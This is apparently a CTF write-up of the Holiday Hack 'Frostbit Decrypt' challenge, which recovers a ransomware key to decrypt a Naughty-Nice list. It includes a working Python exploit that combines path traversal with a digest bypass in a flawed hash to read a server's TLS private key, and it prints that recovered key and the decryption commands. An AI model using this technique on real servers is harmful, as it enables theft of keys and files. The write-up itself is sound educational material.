+++
title = 'Elf Frostbit Decrypt'
date = 2024-12-14T14:54:19+01:00
draft = true
weight = 3
+++

## Objective

> Decrypt the Frostbit-encrypted Naughty-Nice list and submit the first and last name of the child at number 440 in the Naughty-Nice list.

## Hints

| From | Hint |
| ---- | ---- |
| Dusty Giftwrap | There's a new ransomware spreading at the North Pole called Frostbit. Its infrastructure looks like code I worked on, but someone modified it to work with the ransomware. If it is our code and they didn't disable dev mode, we might be able to pass extra options to reveal more information. If they are reusing our code or hardware, it might also be broadcasting MQTT messages. |
| Dusty Giftwrap | The Frostbit ransomware appears to use multiple encryption methods. Even after removing TLS, some values passed by the ransomware seem to be asymmetrically encrypted, possibly with PKI. The infrastructure may also be using custom cryptography to retrieve ransomware status. If the creator reused our cryptography, the infrastructure might depend on an outdated version of one of our libraries with known vulnerabilities. There may be a way to have the infrastructure reveal the cryptographic library in use. |
| Dusty Giftwrap | I'm with the North Pole cyber security team. We built a powerful EDR that captures process memory, network traffic, and malware samples. It's great for incident response - using tools like strings to find secrets in memory, decrypt network traffic, and run strace to see what malware does or executes. |

## IOC's

There are a lot of information available in the ZIP archive. Here I have tried to collect relevant and interesting artefacts found during my investigation. These might come in handy later. 

### IOC's from frostbit_core_dump.13

#### Endpoints

Running this command to find interesting http artefacts: 

```bash
strings frostbit_core_dump.13 | grep http
```

Artefacts found: 

```
https://api.frostbit.app/view/Fgcse2IEk5zg3BhQhlL/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?digest=0081c004828085c081a0e424db82a0a0
https://api.frostbit.app/api/v1/bot/15d977db-9fa9-48f8-be38-d36c2e21b12d/session
https://api.frostbit.app/api/v1/bot/15d977db-9fa9-48f8-be38-d36c2e21b12d/keyit
```

##### Ransomware note

Visiting the urls found from the previous command, I found something interesting: 

```html
https://api.frostbit.app/view/Fgcse2IEk5zg3BhQhlL/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?digest=0081c004828085c081a0e424db82a0a0
```

![Ransomeware note](/images/act3/act3-frostbit-decrypt-1.png)

Links in screenshot verified to not be working. In addition, from the hints (or conversations) it was mentioned a certain debug mode, which can be enabled by adding a "debug" GET parameter equals to 1: 

```
https://api.frostbit.app/view/Fgcse2IEk5zg3BhQhlL/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?digest=0081c004828085c081a0e424db82a0a0&debug=1
```

![Ransomeware note debug mode](/images/act3/act3-frostbit-decrypt-5.png)

Toying with various parameters gives different results, in this case removing one character from the digest:

```json
{
    "debug": true,
    "error": "Status Id File Digest Validation Error: Traceback (most recent call last):\n  File \"/app/frostbit/ransomware/static/FrostBiteHashlib.py\", line 55, in validate\n    decoded_bytes = binascii.unhexlify(hex_string)\nbinascii.Error: Odd-length string\n"
}
```

I notice a reference to a Python file. Further, toying with the "Fgcse2IEk5zg3BhQhlL" part of the URL yielded this error:

```json
{
    "debug": true,
    "error": "Status Id File Not Found"
}
```

And toying with the UUID part (15d977db-9fa9-48f8-be38-d36c2e21b12d):

```json
{
    "debug": true,
    "error": "Invalid UUID Format"
}
```


##### Nonce

Apparently there is an endpoint to retrieve the session nonce:

```html
https://api.frostbit.app/api/v1/bot/15d977db-9fa9-48f8-be38-d36c2e21b12d/session
    
    {
        "nonce": "e998a50d979ee2d7"
    }
```

##### Invalid API Path

This one came broken out of the box, or I had just used it wrong: 

```html
https://api.frostbit.app/api/v1/bot/15d977db-9fa9-48f8-be38-d36c2e21b12d/keyit
    {
        "error": "Invalid API Path"
    }
```

#### Encrypted key JSON

Taking a look closer for any nonces in the core dump:

```bash
strings frostbit_core_dump.13 -n 10 | grep -i nonce
```

I found a JSON structure with two keys, "encryptedKey" and "nonce". Nonce part was empty, but there was a hex string in the "encryptedKey" field:

```json
{"encryptedkey":"2ea5d786947ab4dbc462dc0d1fe878b07f46df032f17b43aeeedea7a2683996377d3b57cc2f94781deef9f81e966309e09e26577d5110836c4236b8dc3bec734ed0060168b30530b99d66cb4d33d9e87712dd71fb8ab6d311430b55743994400e9eb452a378a6c930225f69f46bdef91581a6325b4e873458d4fc9287a2f4af7bbc68a6f3db16b1e463982a815b2fc291b1013e880a2a8f077c1fed52a7673ec1bfc7a4bb6edba03ab670332fa3627f20116f6ceeed97a757bb220494cd696e8f5f05869b6f57f5aef18e204c7213d634b56fae8751b7521d86eb5f7d692313398ff70cded16d5eddef0ec655e7a5279d97a15d1c8efa8aac1c4b0073657007a96e34eeeaae9460629ae9ce5d219d512afef28736e6844f297c02e6cf992e36de5fdc8e0f79b71e92a3ecac6c1b703c84ecd7ca8deb52061441d0c30e3c8be30f3a8658be84a26bf7e7ce3d5b4637da157f7e87795fcfecc8411532ad0cc7c6a8a4de2861c2df429507f1909928cb735b4e3758c139b865e0b2ffceac950880219bdf644e6dca7545c03bff09194624a8fbb0ea54ee6ee3caf4749ca2165873b02e46548be0bbffea92cad7bd89606ed3f1f157d4fedc393007de842ab1e17e23f6fb4b4b963f328f1b55bf2fbe1ad57109a4a835308d6dfa0aaf98069bf44f0c8d50fe302205a82c181587d7fab4c1bf562109593a601f7b026e4236f71fc8f","nonce":""}
```

#### Unspecified IOC's

The following IOC's were collected using the following command:

```bash
strings frostbit_core_dump.13 -n50
```

#### Unrecognized JSON 1

Some random JSON output from what looked like a HTTP request:

```json
{"digest":"10044402b080a8example202088819b8","status":"Key Set","statusid":"ZGTw7qlexampleQNiW"}
{"digest":"0081c004828085c081a0e424db82a0a0","status":"Key Set","statusid":"Fgcse2IEk5zg3BhQhlL"}

```

#### Long HEX text

Appears to be the same for the JSON reply with the "encryptedKey" field: 

```hex
2ea5d786947ab4dbc462dc0d1fe878b07f46df032f17b43aeeedea7a2683996377d3b57cc2f94781deef9f81e966309e09e26577d5110836c4236b8dc3bec734ed0060168b30530b99d66cb4d33d9e87712dd71fb8ab6d311430b55743994400e9eb452a378a6c930225f69f46bdef91581a6325b4e873458d4fc9287a2f4af7bbc68a6f3db16b1e463982a815b2fc291b1013e880a2a8f077c1fed52a7673ec1bfc7a4bb6edba03ab670332fa3627f20116f6ceeed97a757bb220494cd696e8f5f05869b6f57f5aef18e204c7213d634b56fae8751b7521d86eb5f7d692313398ff70cded16d5eddef0ec655e7a5279d97a15d1c8efa8aac1c4b0073657007a96e34eeeaae9460629ae9ce5d219d512afef28736e6844f297c02e6cf992e36de5fdc8e0f79b71e92a3ecac6c1b703c84ecd7ca8deb52061441d0c30e3c8be30f3a8658be84a26bf7e7ce3d5b4637da157f7e87795fcfecc8411532ad0cc7c6a8a4de2861c2df429507f1909928cb735b4e3758c139b865e0b2ffceac950880219bdf644e6dca7545c03bff09194624a8fbb0ea54ee6ee3caf4749ca2165873b02e46548be0bbffea92cad7bd89606ed3f1f157d4fedc393007de842ab1e17e23f6fb4b4b963f328f1b55bf2fbe1ad57109a4a835308d6dfa0aaf98069bf44f0c8d50fe302205a82c181587d7fab4c1bf562109593a601f7b026e4236f71fc8f
```

#### Client and Server handshakes and secrets 

These values when put into a text file and referenced in "(Pre)-Master-Secret log filename", will decode the TLS entries in the associated PCAP.

```
CLIENT_HANDSHAKE_TRAFFIC_SECRET b628d6ae5a2016185a918875556cb201006357548a301e914aaa9fe2ac7490f7 95d29ae475a8cca66237ae742e80ef054694f1cac76005718eda63098ea1ed54
SERVER_HANDSHAKE_TRAFFIC_SECRET b628d6ae5a2016185a918875556cb201006357548a301e914aaa9fe2ac7490f7 60fad6da7c95990bbdaa9c642d8d7f9babb7da4017a709a00b899176ca431807
CLIENT_TRAFFIC_SECRET_0 b628d6ae5a2016185a918875556cb201006357548a301e914aaa9fe2ac7490f7 3a582c4fb15aa9f10aecdaa72ca7b73ae0dfdd8126dd64aa18b3ab80c3957331
SERVER_TRAFFIC_SECRET_0 b628d6ae5a2016185a918875556cb201006357548a301e914aaa9fe2ac7490f7 784b9c051b6ed71221f367cc790ac1b1c8dd70dd8690c69f01262745bf61cd78
```

#### POST request for key

Found this POST request: 

```http
POST /api/v1/bot/15d977db-9fa9-48f8-be38-d36c2e21b12d/key HTTP/1.1
```

### IOC's from PCAP

Once loaded the Client and Server handshakes and secrets, we can decrypt and follow the TLS stream in PCAP:  

```http
GET /api/v1/bot/15d977db-9fa9-48f8-be38-d36c2e21b12d/session HTTP/1.1
Host: api.frostbit.app
User-Agent: Go-http-client/1.1
Accept-Encoding: gzip


HTTP/1.1 200 OK
Server: nginx/1.27.1
Date: Fri, 20 Dec 2024 11:00:08 GMT
Content-Type: application/json
Content-Length: 29
Connection: keep-alive
Strict-Transport-Security: max-age=31536000

{"nonce":"e998a50d979ee2d7"}

POST /api/v1/bot/15d977db-9fa9-48f8-be38-d36c2e21b12d/key HTTP/1.1
Host: api.frostbit.app
User-Agent: Go-http-client/1.1
Content-Length: 1070
Content-Type: application/json
Accept-Encoding: gzip

{"encryptedkey":"2ea5d786947ab4dbc462dc0d1fe878b07f46df032f17b43aeeedea7a2683996377d3b57cc2f94781deef9f81e966309e09e26577d5110836c4236b8dc3bec734ed0060168b30530b99d66cb4d33d9e87712dd71fb8ab6d311430b55743994400e9eb452a378a6c930225f69f46bdef91581a6325b4e873458d4fc9287a2f4af7bbc68a6f3db16b1e463982a815b2fc291b1013e880a2a8f077c1fed52a7673ec1bfc7a4bb6edba03ab670332fa3627f20116f6ceeed97a757bb220494cd696e8f5f05869b6f57f5aef18e204c7213d634b56fae8751b7521d86eb5f7d692313398ff70cded16d5eddef0ec655e7a5279d97a15d1c8efa8aac1c4b0073657007a96e34eeeaae9460629ae9ce5d219d512afef28736e6844f297c02e6cf992e36de5fdc8e0f79b71e92a3ecac6c1b703c84ecd7ca8deb52061441d0c30e3c8be30f3a8658be84a26bf7e7ce3d5b4637da157f7e87795fcfecc8411532ad0cc7c6a8a4de2861c2df429507f1909928cb735b4e3758c139b865e0b2ffceac950880219bdf644e6dca7545c03bff09194624a8fbb0ea54ee6ee3caf4749ca2165873b02e46548be0bbffea92cad7bd89606ed3f1f157d4fedc393007de842ab1e17e23f6fb4b4b963f328f1b55bf2fbe1ad57109a4a835308d6dfa0aaf98069bf44f0c8d50fe302205a82c181587d7fab4c1bf562109593a601f7b026e4236f71fc8f","nonce":"e998a50d979ee2d7"}

HTTP/1.1 200 OK
Server: nginx/1.27.1
Date: Fri, 20 Dec 2024 11:00:08 GMT
Content-Type: application/json
Content-Length: 98
Connection: keep-alive
Strict-Transport-Security: max-age=31536000

{"digest":"0081c004828085c081a0e424db82a0a0","status":"Key Set","statusid":"Fgcse2IEk5zg3BhQhlL"}
```

### OSINT

Dorking on Google I found:

![Ransomeware note](/images/act3/act3-frostbit-decrypt-2.png)

The content of the Python file is:

```python
import traceback
import binascii

class Frostbyte128:
    def __init__(self, file_bytes: bytes, filename_bytes: bytes, nonce_bytes: bytes, hash_length: int = 16):
        self.file_bytes = file_bytes
        self.filename_bytes = filename_bytes
        self.filename_bytes_length = len(self.filename_bytes)
        self.nonce_bytes = nonce_bytes
        self.nonce_bytes_length = len(self.nonce_bytes)
        self.hash_length = hash_length
        self.hash_result = self._compute_hash()

    def _compute_hash(self) -> bytes:
        hash_result = bytearray(self.hash_length)
        count = 0

        for i in range(len(self.file_bytes)):
            xrd = self.file_bytes[i] ^ self.nonce_bytes[i % self.nonce_bytes_length]
            hash_result[count % self.hash_length] = hash_result[count % self.hash_length] ^ xrd
            count += 1

        for i in range(len(self.filename_bytes)):
            count_mod = count % self.hash_length
            count_filename_mod = count % self.filename_bytes_length
            count_nonce_mod = count % self.nonce_bytes_length
            xrd = self.filename_bytes[count_filename_mod] ^ self.nonce_bytes[count_nonce_mod]
            hash_result[count_mod] = hash_result[count_mod] & xrd
            count += 1

        return bytes(hash_result)

    def digest(self) -> bytes:
        """Returns the raw binary hash result."""
        return self.hash_result

    def hexdigest(self) -> str:
        """Returns the hash result as a hexadecimal string."""
        return binascii.hexlify(self.hash_result).decode()

    def update(self, file_bytes: bytes = None, filename_bytes: bytes = None, nonce_bytes: bytes = None):
        """Updates the internal state with new bytes and recomputes the hash."""
        if file_bytes is not None:
            self.file_bytes = file_bytes
        if filename_bytes is not None:
            self.filename_bytes = filename_bytes
        if nonce_bytes is not None:
            self.nonce_bytes = nonce_bytes

        self.hash_result = self._compute_hash()

    def validate(self, hex_string: str):
        """Validates if the provided hex string matches the computed hash."""
        try:
            decoded_bytes = binascii.unhexlify(hex_string)
            if decoded_bytes == self.digest():
                return True, None
        except Exception as e:
            stack_trace = traceback.format_exc()
            return False, f"{stack_trace}"
        return False, None
```

### From other objectives

The Santa Vision objective had some references to Frostbit in the feeds: 

![Feed message 1](/images/act3/act3-frostbit-decrypt-3.png)

![Feed message 2](/images/act3/act3-frostbit-decrypt-4.png)

Appears this path might be important: ```/etc/nginx/certs/api.frostbit.app.key```

## Solution

This objective only has a Gold solution since there were no Silvers given (or available).

### Gold

For this one I had to reach out to the community. It was quickly established that the artefacts of importance were:

* Code file: FrostBiteHashlib.py
* URL: https://api.frostbit.app/view/Fgcse2IEk5zg3BhQhlL/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?digest=0081c004828085c081a0e424db82a0a0
* Debug mode: debug=1 on the above URL

Since this objective hints so heavily towards that Python file, I decided to upload it to ChatGPT and ask if there were any flaws within it. It suggested there was a flaw in the "_compute_hash" method:

> The flaw in the `_compute_hash` function lies in how it combines the file bytes, filename bytes, and nonce bytes to generate the hash. Specifically:
>
>1. **Inconsistent Mixing Logic**: The function first processes the file bytes using a simple XOR operation with the nonce, but then when it processes the filename bytes, it uses a different approach, applying a bitwise AND operation between the nonce and filename bytes. This inconsistency in how the operations are applied makes the function behave unpredictably, especially when handling different input data.
>
>2. **Overwriting Data in Hash**: The function relies on a `count` variable and uses modular arithmetic to determine where to place the result of each operation into the `hash_result` byte array. This can lead to overwriting values within `hash_result`, especially since the hash length might be smaller than the combined length of the file and filename data. As a result, important information might be lost or masked by previous calculations.
>
>3. **Non-deterministic Results**: The modular arithmetic used for indexing can lead to non-deterministic results when the inputs (file, filename, nonce) are slightly modified. A good hash function should produce a consistent and unique result for every unique input, but the current method may not reliably produce distinct results for different data, especially when the size of the data being hashed changes.
>
>In essence, the function mixes the data in an inconsistent and potentially destructive way, which makes it unsuitable for generating unique, reliable hashes.

By this took a closer look at the code and found out that computes an all zeroed hash if xrd == 0, meaning if ```hash_result[count_mod]``` is AND-ed with 0, then the outcome will be 0. It dawned upon me after talking on Discord that we are trying to retrie the "/etc/nginx/certs/api.frostbit.app.key" file.  

Thinking much over it, I came up with the following code: 

```python
import requests
import urllib.parse

# Nonce as Bytes list. The nonce is repeated twice to ensure cyclic overwriting of the hash
nonce = bytes([
    0xe9,
    0x98,
    0xa5,
    0x0d,
    0x97,
    0x9e,
    0xe2,
    0xd7,
    0xe9,
    0x98,
    0xa5,
    0x0d,
    0x97,
    0x9e,
    0xe2,
    0xd7,
])

nonce_string = "%25".join(f"{byte:02x}" for byte in nonce)
separator = urllib.parse.quote_plus(urllib.parse.quote_plus("/"))
payload = f"%25{nonce_string}{separator}"

url = f"https://api.frostbit.app/view/{payload}..%252F..%252F..%252F..%252F..%252Fetc%252Fnginx%252Fcerts%252Fapi.frostbit.app.key/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?debug=1&digest=00000000000000000000000000000000"
res = requests.get(url)

print(url)
print(res.text)
```

To explain the code, let's take a first look at how the URL is built up:

```
https://api.frostbit.app/view/{PATH_A}/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?debug=1&digest=00000000000000000000000000000000"
```
Which gave an URL 

```
https://api.frostbit.app/view/%25e9%2598%25a5%250d%2597%259e%25e2%25d7%25e9%2598%25a5%250d%2597%259e%25e2%25d7%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fnginx%252Fcerts%252Fapi.frostbit.app.key/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?debug=1&digest=00000000000000000000000000000000
```

Upon visiting it, it showed me: 

![Feed message 6](/images/act3/act3-frostbit-decrypt-6.png)

The RSA PRIVATE KEY is:

```
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
```

I quickly tested decrypted the encrypted CSV file, but it wasn't doable. However, I found something interesting earlier on in one of the JSON replies. Namely an encrypted key: 

```
{"encryptedkey":"2ea5d786947ab4dbc462dc0d1fe878b07f46df032f17b43aeeedea7a2683996377d3b57cc2f94781deef9f81e966309e09e26577d5110836c4236b8dc3bec734ed0060168b30530b99d66cb4d33d9e87712dd71fb8ab6d311430b55743994400e9eb452a378a6c930225f69f46bdef91581a6325b4e873458d4fc9287a2f4af7bbc68a6f3db16b1e463982a815b2fc291b1013e880a2a8f077c1fed52a7673ec1bfc7a4bb6edba03ab670332fa3627f20116f6ceeed97a757bb220494cd696e8f5f05869b6f57f5aef18e204c7213d634b56fae8751b7521d86eb5f7d692313398ff70cded16d5eddef0ec655e7a5279d97a15d1c8efa8aac1c4b0073657007a96e34eeeaae9460629ae9ce5d219d512afef28736e6844f297c02e6cf992e36de5fdc8e0f79b71e92a3ecac6c1b703c84ecd7ca8deb52061441d0c30e3c8be30f3a8658be84a26bf7e7ce3d5b4637da157f7e87795fcfecc8411532ad0cc7c6a8a4de2861c2df429507f1909928cb735b4e3758c139b865e0b2ffceac950880219bdf644e6dca7545c03bff09194624a8fbb0ea54ee6ee3caf4749ca2165873b02e46548be0bbffea92cad7bd89606ed3f1f157d4fedc393007de842ab1e17e23f6fb4b4b963f328f1b55bf2fbe1ad57109a4a835308d6dfa0aaf98069bf44f0c8d50fe302205a82c181587d7fab4c1bf562109593a601f7b026e4236f71fc8f","nonce":"e998a50d979ee2d7"}
```

Whipping up a simple decoder script: 

```bash
echo -n "2ea5d786947ab4dbc462dc0d1fe878b07f46df032f17b43aeeedea7a2683996377d3b57cc2f94781deef9f81e966309e09e26577d5110836c4236b8dc3bec734ed0060168b30530b99d66cb4d33d9e87712dd71fb8ab6d311430b55743994400e9eb452a378a6c930225f69f46bdef91581a6325b4e873458d4fc9287a2f4af7bbc68a6f3db16b1e463982a815b2fc291b1013e880a2a8f077c1fed52a7673ec1bfc7a4bb6edba03ab670332fa3627f20116f6ceeed97a757bb220494cd696e8f5f05869b6f57f5aef18e204c7213d634b56fae8751b7521d86eb5f7d692313398ff70cded16d5eddef0ec655e7a5279d97a15d1c8efa8aac1c4b0073657007a96e34eeeaae9460629ae9ce5d219d512afef28736e6844f297c02e6cf992e36de5fdc8e0f79b71e92a3ecac6c1b703c84ecd7ca8deb52061441d0c30e3c8be30f3a8658be84a26bf7e7ce3d5b4637da157f7e87795fcfecc8411532ad0cc7c6a8a4de2861c2df429507f1909928cb735b4e3758c139b865e0b2ffceac950880219bdf644e6dca7545c03bff09194624a8fbb0ea54ee6ee3caf4749ca2165873b02e46548be0bbffea92cad7bd89606ed3f1f157d4fedc393007de842ab1e17e23f6fb4b4b963f328f1b55bf2fbe1ad57109a4a835308d6dfa0aaf98069bf44f0c8d50fe302205a82c181587d7fab4c1bf562109593a601f7b026e4236f71fc8f" | xxd -r -p > encrypted_data.bin

openssl pkeyutl -decrypt -inkey key.pem -in encrypted_data.bin -out decrypted_data_1
```

With this script I got the following output: 

```bash
52685b92ec2ae608c3fe1eedc3789953,e998a50d979ee2d7
```

Appears to be a Symmetric Key and IV Pair. Heading over to Cyberchef to solve it, as it appear to be AES based: 

![Cyberched decode](/images/act3/act3-frostbit-decrypt-7.png)

**Answer:** Xena Xtreme

